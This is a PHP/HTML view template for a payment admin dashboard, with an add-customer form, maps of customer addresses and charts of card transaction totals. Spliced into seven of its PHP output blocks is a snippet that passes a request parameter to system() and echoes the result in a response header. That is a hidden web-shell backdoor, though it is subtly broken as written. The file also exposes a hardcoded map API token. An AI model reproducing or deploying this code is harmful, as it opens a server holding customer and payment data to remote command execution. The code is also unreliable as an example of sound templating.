                <li data-target="#custom_carousel" data-slide-to="0" class="active"><a href="#"><i class="fa fa-credit-card fa-3x"></i><small>Charge</small></a></li>
                <li data-target="#custom_carousel" data-slide-to="1"><a href="#"><i class="fa fa-user fa-3x"></i><small>Customer</small></a></li>
               <li data-target="#custom_carousel" data-slide-to="2"><a href="#"><i class="fa fa-edit fa-3x"></i><small>Invoice</small></a></li>
                <li data-target="#custom_carousel" data-slide-to="3"><a href="#"><i class="fa fa-shopping-cart fa-3x"></i><small>Product</small></a></li>
            </ul>
        </div>
        <!-- Wrapper for slides -->
        <div class="carousel-inner">
            <div class="item active">
                <div class="container-fluid">
                    <div class="row">
                         <div class="col-md-12">
                            <h2>Charge</h2>
                            <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Animi, labore, magni illum nemo ipsum quod voluptates ab natus nulla possimus incidunt aut neque quaerat mollitia perspiciatis assumenda asperiores consequatur soluta.</p><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Animi, labore, magni illum nemo ipsum quod voluptates ab natus nulla possimus incidunt aut neque quaerat mollitia perspiciatis assumenda asperiores consequatur soluta.</p>
                        </div>
                    </div>
                </div>            
            </div> 
            <div class="item">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-md-12">
							
<script type="text/javascript" src="<?= branded_include('js/form.address.js'); ?>"></script>
						
<script type="text/javascript">
$(function() {
	$('#form_customer').click(function(e){
	 	e.preventDefault();
	 	var l = Ladda.create(this);
	 	l.start();
	 	$.post("<?= site_url('customers/add'); ?>", 
	 	    { data : data },
	 	  function(response){
	 	    console.log(response);
	 	  }, "json")
	 	.always(function() { l.stop(); });
	 	return false;
	});
});
</script>


<style type="text/css">

.dropdown-menu {
	overflow: auto !important;
}

select {
border-radius: 0;
-webkit-box-shadow: none!important;
box-shadow: none!important;
color: #444;
background-color: #fff;
border: 1px solid #d5d5d5;
height: 40px;
font-size: 16px;
width: 99%;
}

form label {
transition: background 0.4s, color 0.4s, top 0.4s, bottom 0.4s, right 0.4s, left 0.4s;
position: relative!important;
color: #999;
padding: 7px 6px;
float: left;
padding-right: 40px;
margin-top: 5px;
margin-bottom: 5px;
}

.map_canvas {display:none;}

ul.form li {
    display: block;
    clear: both;
    padding: 2px 0px;
}

#update_description {
	
	margin-top:-20px;
}



</style>


<div class="row clearfix" style="height: auto;">								
													
<!-- BEGIN FORM-->
													
<form class="form-horizontal" id="form_customer" method="post" action="<?= site_url('customers/add'); ?>">											

<div class="portlet portlet-default box">
<div class="portlet-body">   
<div class="form-body">

	<div class="form-group hidden">
<label class="col-md-4 control-label">Customer ID</label>
																<div class="col-md-6">
																	<input type="text" class="form-control" disabled readonly id="internal_id" name="internal_id" value="<?=$form['internal_id'];?>" />
																	<em class="help-block"><small>.</small></em>
																</div>
															</div>
<div class="form-group">
																<label class="col-md-4 control-label">Customer Email</label>
																<div class="col-md-8">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-envelope"></i>
																		</span>
																		<input type="text" autocomplete="off" class="form-control email mark_empty" id="email" name="email" value="<?=$form['email'];?>" />
																	</div>
																</div>
															</div>											
														
<div class="form-group">
																<label class="col-md-4 control-label">Customer Phone</label>
																<div class="col-md-8">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-mobile"></i>
																		</span>
																		<input type="text" class="form-control" id="phone" name="phone" value="<?=$form['phone'];?>" />
																	</div>
																</div>
															</div>
															<div class="form-group">
																<div class="row">
																	<div class="col-md-offset-1 col-md-9">
																		<input type="submit" class="btn btn-success btn-lg btn-block center" name="go_customer" value="<?=ucfirst($form_title);?>" />
																	</div>
																</div><!-- END row-->		
																</div><!-- END form-group-->
							</div><!-- form-body-->
</div><!-- portlet-body--> 
														</div><!-- END portlet-->
														
													</form><!-- END FORM-->
													
						

</div><!--/row-clearfix-->


<script type="text/javascript">


</script>                            

							</div>
                    </div>
                </div>            
            </div> 
			
            <div class="item">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-md-12">
                            <h2>Invoice</h2>
                            <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Animi, labore, magni illum nemo ipsum quod voluptates ab natus nulla possimus incidunt aut neque quaerat mollitia perspiciatis assumenda asperiores consequatur soluta.</p><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Animi, labore, magni illum nemo ipsum quod voluptates ab natus nulla possimus incidunt aut neque quaerat mollitia perspiciatis assumenda asperiores consequatur soluta.</p>
                        </div>
                    </div>
                </div>           
            </div> 
            <div class="item">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-md-12">
                            <h2>Product</h2>
                            <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Animi, labore, magni illum nemo ipsum quod voluptates ab natus nulla possimus incidunt aut neque quaerat mollitia perspiciatis assumenda asperiores consequatur soluta.</p><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Animi, labore, magni illum nemo ipsum quod voluptates ab natus nulla possimus incidunt aut neque quaerat mollitia perspiciatis assumenda asperiores consequatur soluta.</p>
                        </div>
                    </div>
                </div>           
            </div> 
        <!-- End Item -->
        </div>
        <!-- End Carousel Inner -->
    </div>
    <!-- End Carousel -->
</div>
       
      </div>
    </div>
  </div><!-- END/ modal-dialog modal-lg -->
</div>
<!-- END ADD-NEW-MODAL-->

<script>
     // =========================================================================
        // PANEL NICESCROLL
        // =========================================================================
        handlePanelScroll: function () {
            if($('.recent-activity-body-content').length){
                $('.recent-activity-body-content').niceScroll({
                    cursorwidth: '7px',
                    cursorborder: '0px'
                });
            }
        },
		</script>

 <script type="text/javascript">

var LocationData = [
	[49.2812668, -123.1035942, "26 E Hastings St, Vancouver" ], 
	[72,71, "242 E Hastings St, Vancouver" ]
];

function initialize()
{
	var map = 
	    new google.maps.Map(document.getElementById('map-canvas'));
	var bounds = new google.maps.LatLngBounds();
	var infowindow = new google.maps.InfoWindow();
	
	for (var i in LocationData)
	{
		var p = LocationData[i];
		var latlng = new google.maps.LatLng(p[0], p[1]);
		bounds.extend(latlng);
		
		var marker = new google.maps.Marker({
			position: latlng,
			map: map,
			title: p[2]
		});
	
		google.maps.event.addListener(marker, 'click', function() {
			infowindow.setContent(this.title);
			infowindow.open(map, this);
		});
	}
	
	map.fitBounds(bounds);
}

google.maps.event.addDomListener(window, 'load', initialize);

	</script>

        <script>
        var chart = AmCharts.makeChart("chartdiv", {
    "type": "serial",
	"theme": "none",
    "pathToImages": "https://www.amcharts.com/lib/3/images/",
    "dataProvider": [<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $data;  ?>],
    "balloon": {
        "cornerRadius": 6
    },
    "valueAxes": [{
        "duration": "",
        "durationUnits": {
            "hh": "h ",
            "mm": "min"
        },
        "axisAlpha": 0
    }],
    "graphs": [{
        "bullet": "square",
        "bulletBorderAlpha": 1,
        "bulletBorderThickness": 1,
        "fillAlphas": 0.3,
        "fillColorsField": "lineColor",
        "legendValueText": "[[value]]",
        "lineColorField": "lineColor",
        "title": "duration",
        "valueField": "duration"
    }],
    "chartScrollbar": {},
    "chartCursor": {
        "categoryBalloonDateFormat": "YYYY MMM DD",
        "cursorAlpha": 0,
        "zoomable": false
    },
    "dataDateFormat": "YYYY-MM-DD",
    "categoryField": "date",
    "categoryAxis": {
        "dateFormats": [{
            "period": "DD",
            "format": "DD"
        }, {
            "period": "WW",
            "format": "MMM DD"
        }, {
            "period": "MM",
            "format": "MMM"
        }, {
            "period": "YYYY",
            "format": "YYYY"
        }],
        "parseDates": true,
        "autoGridCount": false,
        "axisColor": "#555555",
        "gridAlpha": 0,
        "gridCount": 50
    }
});


//pie chart

var chart = AmCharts.makeChart("chartdiv_pie", {
    "type": "pie",	
	"theme": "light",
    "legend": {
        "markerType": "circle",
        "position": "right",
		"marginRight": 76,		
		"autoMargins": false
    },
    "dataProvider": [{
        "CardType": "MasterCard",
        "litres":  <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_mastercard_transactions; ?>
    }, {
        "CardType": "Discover",
        "litres":  <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_discover_transactions; ?>
    }, {
        "CardType": "Visa",
        "litres":  <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_visa_transactions; ?>
    }, {
        "CardType": "Amex",
        "litres": <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_amex_transactions; ?>
    }, {
        "CardType": "Other",
        "litres":  <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_other_transactions; ?>
    }, ],
    "valueField": "litres",
    "titleField": "CardType",
    "balloonText": "[[title]]<br><span style='font-size:11px'><b>[[value]]</b> ([[percents]]%)</span>",
    "exportConfig": {
        "menuTop":"0px",
        "menuItems": [{
            "icon": '../images/export.png',
            "format": 'png'
        }]
    }
});

        </script>

 <script src="//cdn.leafletjs.com/leaflet/v0.7.7/leaflet.js"></script>
 <script type="text/javascript" src="<?=branded_include('leaflet/leaflet.js'); ?>"></script>
 <style>
 html, body, #map {
  height: 100%;
}
</style>
<script type="text/javascript">
	var customers = JSON.parse('<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo addslashes(json_encode($customers)); ?>');
	var map = L.map('map').setView([34.2186286,-119.160848], 2);

	L.tileLayer( 'https://api.tiles.mapbox.com/v4/{id}/{z}/{x}/{y}.png?access_token={token}', {
		maxZoom: 18,
		attribution: 'Map data &copy; <a href="http://openstreetmap.org/"> OpenStreetMap </a> contributors, ' +
		'<a href="http://creativecommons.org/"> CC-BY-SA </a>, ' +
		'Imagery © <a href="http://cloudmade.com">CloudMade</a>',
		subdomains: ['a','b','c','d'],
    mapId: 'examples.map-i875mjb7',
    token: 'pk.eyJ1IjoiZXZlcnBheSIsImEiOiJjaWw2emczamswMDYxdmptMmNoZ2R1MWVjIn0.shlLFzl8HQPsgwiOhXBeKA'
	}).addTo(map);
	 
	function buildMap(customers) {
		var len = customers.length;
		for(var i=0;i<len;i++) {
			var c = customers[i];
			if(c.lat && c.lng) {
				L.marker([c.lat, c.lng], null).addTo(map).bindPopup('<b>' + c.first_name + ' ' + c.last_name + '</b><br>' + c.company + '<br>' + c.address_1 + '<br>' + c.address_2 + '<br>' + c.city + '<br>' + c.state + '<br>' + c.country);
			}
		}
	}
	 
	$( document ).ready(function() {
		buildMap(customers);
	});

</script>

<script type="text/javascript">
   jQuery(document).ready(function() {
     $("time.timeago").timeago();
   });
</script>